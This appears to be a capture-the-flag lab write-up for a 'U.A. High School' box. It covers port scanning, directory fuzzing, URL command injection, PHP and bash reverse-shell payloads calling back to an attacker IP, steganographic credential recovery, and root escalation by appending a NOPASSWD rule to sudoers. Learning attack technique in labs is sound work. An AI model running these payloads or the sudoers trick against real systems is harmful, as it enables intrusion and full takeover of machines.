</br> Do a basic port scan
</br> nmap -sT -p- -T3 10.10.254.41 -v
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
</br> More advanced port scan
```
nmap 22 80 -A -T3 10.10.254.41 -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
```
</br> enumerate directories:

</br> `gobuster dir -u http://10.10.254.41:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt `
```
/assets               (Status: 301) [Size: 313] [--> http://10.10.254.41/assets/]
/server-status        (Status: 403) [Size: 277]
```

</br> looks simple enough as a webpage... 
![port80On3](https://github.com/user-attachments/assets/6efd3f92-b2a1-4e60-b03e-89eaa372b854)
</br> /assets exists, but it's blank
</br> there is at least css in the /assets folder, but it's restricted
</br> That means there is more content, but we just can't see it from the client-side
![probablyeedToGoDeeperEmptyHTML](https://github.com/user-attachments/assets/9220a87e-9e97-4001-b4af-58e4a0a928c4)

![assetsMustExist](https://github.com/user-attachments/assets/cb2a2ae8-2f20-4836-b66e-05a4ff919356)
</br> contact page might be an injection vector... added to notes
![possibleInjectionVector](https://github.com/user-attachments/assets/7176c187-0b97-45ce-b7bf-670ddc2d9d42)
</br> images exist but are forbidden
![imagesExistsButForbidden](https://github.com/user-attachments/assets/d35b5117-bec2-424c-b781-ce886167ace4)

</br> fuzzing deeper -->
</br> `wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 31 http://10.10.254.41:80/assets/FUZZ`
</br> seemingly there's nothing we can access here, since images is forbidden...
</br> BRICK WALL ... I hate this
</br> hunting through more wordlists since this can't be the comprehensive be-all-end-all...
</br> `wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt --hw 31 http://10.10.254.41:80/assets/FUZZ`
![okayTheresHiddenStuffWithdots](https://github.com/user-attachments/assets/0db489e5-f311-4f41-99d5-d1837ac37b42)
</br> revised wordlist finds stuff hidden with leading dots
</br> ! Just drill this into your head: if I find .php, I should try `index.php` for command injection
</br> url command injection...`url+?cmd=whoami`
![qwefwerb](https://github.com/user-attachments/assets/c48387ca-b0b9-4f42-8bba-b9325fe0c78b)

</br> `whoami`
</br> d3d3LWRhdGEK
</br> What in the world is this response? An encoded name

</br> 
</br> inject to read `cat /etc/passwd`
</br> cm9vdDp4 (omitted) ... c2UK
</br> it's easier to copy this junk from the field in inspector
![copyeasierInInspector](https://github.com/user-attachments/assets/ddabee53-4f5f-44e6-bc24-3f79ece04d2e)


</br> also read `ls -la content`
</br> dG90YWwgMj (omitted) zcwo=
</br> encrypted, with the = at the end looks like base64
![infoLEak4](https://github.com/user-attachments/assets/50caaa4a-47d7-40a4-9aef-f1cc1775a502)
</br> decode it to reveal content, here it reveals the listing command I gave
![decodeToRevealData](https://github.com/user-attachments/assets/681ff94d-9dd6-4d1a-9b98-c7841e03b9d1)
</br> see if i can get a rev shell
</br> 
</br> netcat and reverse shell
</br> nc -nvlp 1984

```
http://10.10.254.41/assets/index.php?cmd=php -r '$sock=fsockopen("10.10.105.73", 1984);exec("sh <&3 >&3 2>&3");'
```
![revshellurlEncode](https://github.com/user-attachments/assets/6a0b0861-e3a3-4909-9193-c997e8e3f368)

</br> dang it, doesn't work....
</br> I need to go to revshells.com and url encode this junk...
</br> It's a command injection, so that should be a PHP exec situation.
</br> (different IP because new session started, dumb timeouts...)
```
http://10.10.4.218/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.152.50%22%2C1984)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```![revshellurlEncode](https://github.com/user-attachments/assets/707d75d4-eb4a-49c4-b498-4af114246678)
</br> make sure to click the url encode button on rev shells if you're doing a url injection.
</br> ![executeINUrlImg](https://github.com/user-attachments/assets/edec1121-9999-4699-a31b-289d034239a0)
</br> when it hangs, we should get a proper connection
![listenerShouldHaveConnectionRecieved_IMPORTANT](https://github.com/user-attachments/assets/6f1b1289-4a98-4080-be24-7627ace77d1f)

</br> upgrade to terminal session
![upgradeTerminal1](https://github.com/user-attachments/assets/44d70dc4-5456-482b-b863-4bceeae7ed66)


</br> python3 -c 'import pty; pty.spawn("/bin/bash")'
</br> we find images
![okayItems2](https://github.com/user-attachments/assets/aa5fe5ed-411b-4d2f-a6de-b29f20d79010)

</br> set up a python server and a port in the directory with the images
</br> wget the images off the port indicated by our python server; we need to use the ip of the target machine though.
</br> set up http server, then connect with the target ip address (ignore what python says it's serving on, except for the port, the IP is the target regardless of python's message)
</br> 
![needToUseTargetIPInWgetRequestEvenThoPythonSays000](https://github.com/user-attachments/assets/d0edcc04-eb5e-43f6-9f0e-0167c19de6f9)

</br> `wget http://10.10.4.218/assets/images/yuei.jpg`
</br> `wget http://10.10.4.218/assets/images/oneforall.jpg`
</br> 
</br> After both files are downloaded, look at them...
</br> can't open them...
</br> steghide doesn't recognize it either.
</br> file command says it's data? Let's try changing it to .jpg like it seems it should be
</br> 
</br> gotta use hexedit and magic numbers as if it's corrupted file data we're restoring

</br> reference to --> `https://en.wikipedia.org/wiki/List_of_file_signatures`
</br>  JPG starts off as : `FF D8 FF E0 00 10 4A 46 49 46 00 01`
</br> ![jfifIGuess](https://github.com/user-attachments/assets/a8c18c8d-495a-4d32-bbd9-2db8339d7042)
![ctrlxSave](https://github.com/user-attachments/assets/6504df1b-03ae-4830-ac66-8dde205f1b75)

</br> `ctrl + x` --> quit editing, be sure to hit "y" to save when the prompt above occurs
![passphrase2123213](https://github.com/user-attachments/assets/9d5268b1-f266-44a2-870f-a284b41f5611)

</br> can't open anything as it wants a password
</br> 
</br> in typical web enumeration fashion, we search `/var/www` to see what contents we got, and find a hidden dir with a txt file in it.
![dirWithPassphrase2](https://github.com/user-attachments/assets/d6b11530-2b86-4d5e-a20e-f0e42afb0600)

</br> decode the base64 --> QWxsbWlnaHRGb3JFdmVyISEhCg==
</br> echo  QWxsbWlnaHRGb3JFdmVyISEhCg==| base64 -d
![getThebase64decoded3](https://github.com/user-attachments/assets/73634d52-5475-432c-8988-58c3c7ef01b6)

</br> > AllmightForEver!!!
</br> thank goodness there's not an auto-termination of file contents on a failure to input the correct passphrase. That would be some supa-hacka hot garbage.
</br> using the passphrase we can unlock the hidden info using steghide
![credsinHidden1](https://github.com/user-attachments/assets/bccf2204-501f-44e8-91da-9b41685921eb)

</br> content of creds.txt
```
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

</br> ssh in with the creds...
</br> (can now get user.txt)
![canSSHAfterThat](https://github.com/user-attachments/assets/fd5c2a0b-2858-44fe-89c1-2577c77db07a)

</br> let's not run sudo -l and NOT trip an alarming log...
</br> `find / -perm -4000 2>/dev/null`
</br> (should't this command also be configured to trigger an alarm?)
![nutsr23r23](https://github.com/user-attachments/assets/05d1910e-4e14-4a14-b486-e95059550919)
</br> nothing i can do or find in /tmp...
</br> sudo -l WAS the correct escalation path... I hate the mixed messages of what is or isn't best practice, learning one thing from one box doesn't apply to another... 
</br> within feedback.sh we can write a malicious payload
</br> as shown below, we can append files from within the call to this feedback.sh input field; below I make the potato file

</br> we can write to a .sh file; header claims it as /bin/bash.
</br> ![isABashFile](https://github.com/user-attachments/assets/ecc4a089-e2aa-4ce6-970e-81e786472067)
 </br>
 </br> `bash -i >& /dev/tcp/10.10.152.50/1776 0>&1`
</br> 
</br> I can't execute commands, but apparently I can write or append to files with the shovel `>>` operator.
![canoing43](https://github.com/user-attachments/assets/9bbd3b8a-d203-444c-9f04-3c3c56bc0a03)
</br> `Deku ALL-NOPASSWD: ALL >> /ec/sudoers`
</br> give user Deku the ability to run anything as superuser without any password.
 </br>
</br> sudo /bin/bash to simply become root
</br> Neat ascii art, btw
![neatAsciiArt](https://github.com/user-attachments/assets/764e0bc1-496e-4d59-b355-138291415fc4)

